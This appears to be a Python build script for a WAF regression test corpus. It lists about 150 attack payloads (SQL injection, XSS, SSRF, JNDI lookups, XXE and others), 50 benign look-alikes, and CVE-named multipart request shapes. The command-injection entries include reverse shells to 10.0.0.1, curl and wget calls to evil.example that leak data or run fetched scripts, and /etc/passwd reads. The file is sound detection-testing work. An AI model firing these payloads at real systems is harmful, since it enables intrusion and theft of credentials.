#!/usr/bin/env python3
"""Authoring source for the WAF regression corpus → emits corpus.json.

200 entries: 150 malicious across 15 attack classes + 50 benign-but-spicy
(legit traffic that *looks* attack-ish — the false-positive testers). Hand-
curated and stable: this is the versioned baseline, not a per-run set. Grow it
from public corpora (OWASP CRS regression suite, PayloadsAllTheThings, fuzzdb)
for a future higher-cardinality v2 — keep this v1 intact for comparability.

Regenerate: python3 build-corpus.py  →  corpus.json
"""
import json
from pathlib import Path

MAL = {
 "sqli": [
  "' OR '1'='1", "1' OR '1'='1' -- ", "admin'--", "admin' #", "'; DROP TABLE users;--",
  "1 UNION SELECT username,password FROM users", "' UNION ALL SELECT NULL,NULL,NULL--",
  "' UNION SELECT @@version,2,3--", "' OR SLEEP(5)--", "1;WAITFOR DELAY '0:0:5'--",
  "' AND extractvalue(1,concat(0x7e,version()))--", "'; EXEC xp_cmdshell('whoami')--",
  "\") OR (\"1\"=\"1", "' AND 1=CONVERT(int,@@version)--",
  "1' AND '1'='1' UNION SELECT load_file('/etc/passwd')--", "%27%20OR%201=1--",
  "0x27206f7220313d31", "' oR/**/1=1#", "' Or 1=1 Limit 1 -- ",
  "1') OR ('a'='a", "'||(SELECT pass FROM users LIMIT 1)||'", "' OR 1=1 INTO OUTFILE '/tmp/x'--",
 ],
 "xss": [
  "<script>alert(1)</script>", "<img src=x onerror=alert(document.cookie)>", "javascript:alert(1)",
  "<svg/onload=alert(1)>", "\"><script>alert(String.fromCharCode(88))</script>", "<body onload=alert(1)>",
  "<iframe src=\"javascript:alert(1)\">", "<input autofocus onfocus=alert(1)>", "<details open ontoggle=alert(1)>",
  "<marquee onstart=alert(1)>", "<a href=\"javascript:alert(1)\">x</a>", "<scr<script>ipt>alert(1)</scr</script>ipt>",
  "'-alert(1)-'", "<img src=1 onerror=\"&#97;lert(1)\">", "<svg><animate onbegin=alert(1) attributeName=x>",
  "<select autofocus onfocus=alert(1)>", "<video><source onerror=alert(1)>", "javascript:/*--></title></style></script><svg onload=alert(1)>",
  "%3Cscript%3Ealert(1)%3C/script%3E", "<x onclick=alert(1)>click", "<object data=\"javascript:alert(1)\">",
  "<math><mtext><script>alert(1)</script>",
 ],
 "cmdi": [
  "; cat /etc/passwd", "| whoami", "$(id)", "`id`", "&& ls -la /", "; rm -rf /tmp/x",
  "|| curl http://evil.example/$(whoami)", "; nc -e /bin/sh 10.0.0.1 4444", "; ping -c 4 127.0.0.1",
  "$(python -c 'import os;os.system(\"id\")')", "%0acat%20/etc/passwd", "; sleep 5",
  "& type C:\\\\Windows\\\\win.ini", "$IFS$9cat$IFS/etc/passwd", "{cat,/etc/passwd}",
  ";curl${IFS}evil.example", "`wget http://evil.example/x.sh -O- | sh`", "; bash -i >& /dev/tcp/10.0.0.1/4444 0>&1",
 ],
 "path": [
  "../../../etc/passwd", "..%2f..%2f..%2fetc%2fpasswd", "....//....//etc/shadow",
  "..\\..\\..\\windows\\win.ini", "%2e%2e%2f%2e%2e%2fetc/passwd", "/proc/self/environ",
  "file:///etc/passwd", "/var/www/html/../../../../etc/passwd", "..%252f..%252fetc/passwd",
  "..%c0%af..%c0%afetc/passwd", "/etc/passwd%00.png", "....\\\\....\\\\boot.ini",
  "php://filter/convert.base64-encode/resource=/etc/passwd", "/..%5c..%5c..%5cwindows/system32/drivers/etc/hosts",
 ],
 "ssrf": [
  "http://169.254.169.254/latest/meta-data/iam/security-credentials/", "http://localhost:6379/",
  "gopher://127.0.0.1:11211/_stats", "dict://127.0.0.1:11211/stat", "http://[::ffff:169.254.169.254]/",
  "http://127.0.0.1:22", "http://0.0.0.0:8080/admin", "http://metadata.google.internal/computeMetadata/v1/",
  "http://2130706433/", "file:///proc/self/cwd", "ftp://127.0.0.1/", "http://localhost%2f%2e%2e/admin",
 ],
 "jndi": [
  "${jndi:ldap://evil.example/a}", "${jndi:rmi://x.example/y}", "${${lower:j}ndi:dns://x.example}",
  "${env:AWS_SECRET_ACCESS_KEY}", "${jndi:ldap://127.0.0.1:1389/Basic/Command/Base64/aWQ=}",
  "${sys:user.name}", "${jndi:${lower:l}${lower:d}ap://x}", "${date:YYYY}",
 ],
 "ssti": [
  "{{7*7}}", "${7*7}", "<%= 7*7 %>", "#{7*7}", "{{config.items()}}", "{{''.__class__.__mro__[2].__subclasses__()}}",
  "${T(java.lang.Runtime).getRuntime().exec('id')}", "{{request.application.__globals__}}", "@(7*7)", "{%if 1%}x{%endif%}",
 ],
 "xxe": [
  "<!DOCTYPE foo [<!ENTITY xxe SYSTEM \"file:///etc/passwd\">]><foo>&xxe;</foo>",
  "<?xml version=\"1.0\"?><!DOCTYPE r [<!ENTITY e SYSTEM 'file:///etc/passwd'>]><r>&e;</r>",
  "<!ENTITY % xxe SYSTEM \"http://evil.example/x\">",
  "<!DOCTYPE x [<!ENTITY % a SYSTEM 'file:///etc/passwd'><!ENTITY % b '<!ENTITY c \"%a;\">'>%b;]>",
  "<?xml version=\"1.0\" encoding=\"UTF-7\"?>", "<!DOCTYPE r SYSTEM \"http://evil.example/r.dtd\">",
 ],
 "nosql": [
  "{\"$gt\":\"\"}", "{\"$ne\":null}", "';return true;//", "admin' || '1'=='1",
  "{\"$where\":\"sleep(5000)\"}", "{\"username\":{\"$regex\":\".*\"}}", "[$ne]=1", "{\"$gt\":undefined}",
 ],
 "ldap": [
  "*)(uid=*))(|(uid=*", "*()|%26'", "admin)(&)", "*)(objectClass=*", "*)(|(password=*))",
 ],
 "crlf": [
  "foo\r\nSet-Cookie: sessid=hijacked", "x%0d%0aLocation:%20http://evil.example",
  "%0d%0aContent-Length:%200%0d%0a%0d%0a", "test%0aSet-Cookie:%20admin=true",
  "%E5%98%8D%E5%98%8ASet-Cookie:%20x=1", "a\r\nHost: evil.example", "%0d%0a%0d%0a<script>alert(1)</script>",
  "/%0d%0aX-Injected: true",
 ],
 "redirect": [
  "//evil.example", "https://evil.example", "/\\evil.example", "javascript:alert(document.domain)", "data:text/html,<script>alert(1)</script>",
 ],
 "deser": [
  "O:8:\"stdClass\":0:{}", "rO0ABXNyAA==", "__import__('os').system('id')",
  "{\"__proto__\":{\"isAdmin\":true}}", "constructor[prototype][isAdmin]=true", "!!python/object/apply:os.system ['id']",
 ],
 "graphql": [
  "query{__schema{types{name}}}", "{user(id:\"1 OR 1=1\"){name}}", "mutation{deleteAllUsers}",
 ],
 "header": [
  "() { :;}; /bin/cat /etc/passwd", "User-Agent: () { :; }; echo vuln", "X-Forwarded-For: 127.0.0.1, evil",
 ],
}

BENIGN = [
 "SELECT a plan that fits your team", "I'll alert you the moment it's ready",
 "the union of designers and engineers", "price > 100 AND rating < 5 stars",
 "1=1 is a tautology we cover in math class", "O'Brien", "D'Angelo & Sons, Inc.",
 "user@example.com", "https://maps.example.com/?q=cafe+near+me", "function() { return total * 1.2; }",
 "<b>Bold</b> and <i>italic</i> text", "José from São Paulo, naïve café", "path/to/my/report.2024.json",
 "drop me an email when you can", "a great script for the school play", "SELECT-O-MATIC vacuum, model X",
 "comment count: 42; likes: 1337", "Mëtàl Ümläut Bänd — live in concert", "C:\\\\Users\\\\me\\\\Documents\\\\file.txt",
 "2 * 7 = 14 and 7 * 7 = 49", "order by date, then by name please", "the cat sat on the mat",
 "{\"name\":\"Acme\",\"qty\":3,\"price\":9.99}", "search: best practices for REST APIs", "passwd reset link requested",
 "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NSJ9.abc", "git commit -m 'fix the parser'",
 "let x = a && b || c;", "the script kiddie movie was fun", "100% organic & fair-trade",
 "我喜欢编程 and I love coding", "naïve approach to the problem", "Schrödinger's cat is both",
 "https://en.wikipedia.org/wiki/SQL_injection", "regex: ^[a-z]+$ matches lowercase", "a < b and b > c",
 "<!-- this is an HTML comment -->", "SELECT * is an anti-pattern, avoid it", "alert: low disk space on /var",
 "the password must be 12+ chars", "Q1 revenue grew 7*7 percent (kidding)", "DROP-DOWN menu styling",
 "use UNION types in TypeScript", "../docs/readme.md relative link", "cmd+shift+p opens the palette",
 "{{ user.name }} in a Jinja template doc", "$HOME/.config/app.toml", "exec summary attached",
 "id: 12345, name: Acme Corp", "onclick handlers should be CSP-safe",
]

# ── multipart/form-data structure shapes (#694) ────────────────────────────
# Full requests, not query/JSON payloads: each carries a Content-Type and a raw
# body built here so the CRLF framing is exact. `{PAD:N}` expands (in run.py) to
# N bytes, keeping oversized shapes compact in the committed corpus. The malicious
# set is the REQUEST SHAPE of each CVE — a part flood, an oversized header, a bad
# field/part-header name, a preamble, a smuggling content-type — never a weaponized
# exploit. Detection assumes the corpus WAF profile's tightened limits
# (see benchmarks/zion-bench-tls-waf.toml): max_parts 20, max_file_parts 10,
# max_part_headers 6, max_part_header_bytes 512, deny_field_names
# [PHP_SESSION_UPLOAD_PROGRESS], default deny_part_header_names + max_field_name_index.
B = "ZNWAF"  # boundary for the well-formed-framing shapes


def part(name=None, filename=None, headers=None, content="v"):
    lines = []
    if name is not None:
        cd = f'Content-Disposition: form-data; name="{name}"'
        if filename is not None:
            cd += f'; filename="{filename}"'
        lines.append(cd)
    lines += headers or []
    return "\r\n".join(lines) + "\r\n\r\n" + content


def mpbody(boundary, parts):
    out = f"--{boundary}"
    for p in parts:
        out += "\r\n" + p + "\r\n--" + boundary
    return out + "--"


def ctf(boundary):
    return f"multipart/form-data; boundary={boundary}"


MULTIPART_MAL = [
    ("CVE-2025-48988 Tomcat part flood", ctf(B),
     mpbody(B, [part(name=f"f{i}") for i in range(30)])),
    ("CVE-2025-48976 Commons FileUpload oversized part headers", ctf(B),
     mpbody(B, [part(name="f", headers=["X-Pad: {PAD:600}"])])),
    ("CVE-2026-42561 python-multipart part-header flood", ctf(B),
     mpbody(B, [part(name="f", headers=[f"X-H{i}: v" for i in range(10)])])),
    ("CVE-2026-94440 Go huge header line", ctf(B),
     mpbody(B, [part(name="f", headers=["X-Big: {PAD:600}"])])),
    ("CVE-2026-111066 aiohttp file-part flood", ctf(B),
     mpbody(B, [part(name=f"f{i}", filename=f"f{i}.bin") for i in range(15)])),
    ("CVE-2026-19481 busboy __proto__ part header", ctf(B),
     mpbody(B, [part(name="f", headers=["__proto__: x"])])),
    ("PHP2Shell PHP_SESSION_UPLOAD_PROGRESS field", ctf(B),
     mpbody(B, [part(name="PHP_SESSION_UPLOAD_PROGRESS", content="x")])),
    ("CVE-2024-53981 python-multipart preamble flood", ctf(B),
     "{PAD:400}" + mpbody(B, [part(name="f")])),
    ("CVE-2026-41853 Spring content-type smuggle (multipart/mixed)", f"multipart/mixed; boundary={B}",
     mpbody(B, [part(headers=["Content-Type: text/plain"]) for _ in range(30)])),
    ("CVE-2026-77078 multer field array index", ctf(B),
     mpbody(B, [part(name="items[4294967295]", content="x")])),
    ("CVE-2026-109618 PHP OOM trigger, mitigated (oversized filename)", ctf(B),
     mpbody(B, [part(name="f", filename="{PAD:600}")])),
]

MULTIPART_BENIGN = [
    ("benign browser form (text field + small file)", ctf("----WebKitFormBoundaryAbC123"),
     mpbody("----WebKitFormBoundaryAbC123",
            [part(name="title", content="hello world"),
             part(name="avatar", filename="me.png", content="pngdata-small")])),
    ("benign curl -F upload", ctf("------------------------abc123def456"),
     mpbody("------------------------abc123def456",
            [part(name="field", content="value"),
             part(name="file", filename="doc.txt", content="some document text")])),
    ("benign array form (small indices)", ctf(B),
     mpbody(B, [part(name="items[0]", content="a"),
                part(name="items[1]", content="b"),
                part(name="user[name]", content="Alice")])),
    ("benign large file upload", ctf(B),
     mpbody(B, [part(name="upload", filename="big.bin", content="{PAD:262144}")])),
    ("benign multipart/mixed well-formed", f"multipart/mixed; boundary={B}",
     mpbody(B, [part(headers=["Content-Type: text/plain"], content="hello"),
                part(headers=["Content-Type: application/json"], content="{}")])),
]

corpus = []
for cat, items in MAL.items():
    for p in items:
        corpus.append({"category": cat, "kind": "mal", "payload": p})
for p in BENIGN:
    corpus.append({"category": "benign", "kind": "benign", "payload": p})
for note, ct, body in MULTIPART_MAL:
    corpus.append({"category": "multipart", "kind": "mal", "vector": "multipart",
                   "content_type": ct, "body": body, "note": note})
for note, ct, body in MULTIPART_BENIGN:
    corpus.append({"category": "multipart", "kind": "benign", "vector": "multipart",
                   "content_type": ct, "body": body, "note": note})

mal_n = sum(1 for c in corpus if c["kind"] == "mal")
ben_n = sum(1 for c in corpus if c["kind"] == "benign")
out = Path(__file__).parent / "corpus.json"
out.write_text(json.dumps(corpus, ensure_ascii=False, indent=1))
print(f"wrote {out} — {len(corpus)} entries ({mal_n} malicious / {ben_n} benign), {len(MAL)} attack classes")
